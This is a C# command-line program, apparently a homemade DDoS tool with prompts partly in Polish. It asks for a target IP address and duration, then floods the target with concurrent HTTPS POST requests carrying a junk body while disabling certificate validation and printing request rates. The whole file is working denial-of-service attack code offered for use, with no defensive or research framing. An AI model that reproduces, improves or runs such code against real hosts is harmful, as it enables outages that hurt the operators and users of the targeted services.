using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Globalization;
using System.Runtime.CompilerServices;
using RestSharp;

namespace AttackCLI
{
    class Program
    {
        private static int operationTimeInSeconds = 10;
        private static DateTime endTime;

        static void Main(string[] args)
        {
            DDOSAttack();
        }


        public static void WriteToConsole(string Message)
        {
            lock (Console.Out)
            {
                Console.WriteLine(Message);
            }
        }
        
        [SuppressMessage("ReSharper.DPA", "DPA0002: Excessive memory allocations in SOH", MessageId = "type: System.Threading.Tasks.Task; size: 3909MB")]
        [SuppressMessage("ReSharper.DPA", "DPA0000: DPA issues")]
        static void DDOSAttack()
        {
            var ipToAttack = "";
            Task attackCreator = null;
            int numberOfTaskCreators = 1;
            double timeout = 1;
            if (string.IsNullOrEmpty(ipToAttack))
            {
                Console.Write("Please enter a valid IP address to attack:");
                ipToAttack = Console.ReadLine();
            }
            
            Console.WriteLine("Jaki ma byc zamierzony czas operacyjny ( w sekundach )?:");
            try
            {
                operationTimeInSeconds = int.Parse(Console.ReadLine());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error parsing operation time. Time set to 10 seconds");
                operationTimeInSeconds = 10;
            }

            Console.WriteLine("Podaj timeout w sekundach");
            timeout = double.Parse(Console.ReadLine());
            
            endTime = DateTime.Now.AddSeconds(operationTimeInSeconds);
            Console.WriteLine($"Uruchamiam attack na ip: https://{ipToAttack} Methodą POST z body: \n AASDAWEQ#RQWQ@#!)$%&!)@#$!#*%T(QIFYOC $!@O*(%@#!@$QWRE@$F!%$!!G$%!@ liujfglik;sgkilsjf;wilunhvoi214uoi@u34o1upvt894gvujm4028vtr7uvuewq89cfmjf82ty2");
            attackCreator = new Task(() =>
            {
                var requestsPerSecond = 0;
                var secondsToEnd = endTime.Second - DateTime.Now.Second;
                while (DateTime.Now < endTime)
                {
                    var secondsToEndUpdate = endTime.Second - DateTime.Now.Second;
                                 if (secondsToEndUpdate < secondsToEnd)
                                 {
                                     secondsToEnd = secondsToEndUpdate;
                                     WriteToConsole($"({secondsToEndUpdate}secs) Requests per second {requestsPerSecond}");
                                     requestsPerSecond = 0;
                                     Console.WriteLine($"Memory usage {Process.GetCurrentProcess().WorkingSet64 / 1024 / 1024} MB");
                                     if (Process.GetCurrentProcess().PrivateMemorySize64 / 1024 / 1024 / 1024 > 30_000)
                                     {
                                         Console.WriteLine("Pamieć przepełniona!");
                                         continue;
                                     }

                                 }
                    var task = new Task(() =>
                    {
                        using var client = new RestClient($"https://{ipToAttack}", options =>
                        {
                            options.Timeout = TimeSpan.FromSeconds(timeout);
                            options.RemoteCertificateValidationCallback =
                                (sender, certificate, chain, sslPolicyErrors) => true;
                        });
                        try
                        {
                            client.Execute(new RestRequest("", Method.Post)
                                .AddBody("AASDAWEQ#RQWQ@#!)$%&!)@#$!#*%T(QIFYOC $!@O*(%@#!@$QWRE@$F!%$!!G$%!@$F!@" +
                                         "liujfglik;sgkilsjf;wilunhvoi214uoi@u34o1upvt894gvujm4028vtr7uvuewq89cfmjf82ty2"));
                            
                        }
                        catch (Exception ex)
                        {
                            WriteToConsole($"Error: {ex.Message}");
                        }

                       
                    });
                    task.Start();
                    requestsPerSecond += 1;
                }
            });
            
            attackCreator.Start();
            Thread.Sleep(operationTimeInSeconds * 1000 + 2000); 
            //Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }
    }
}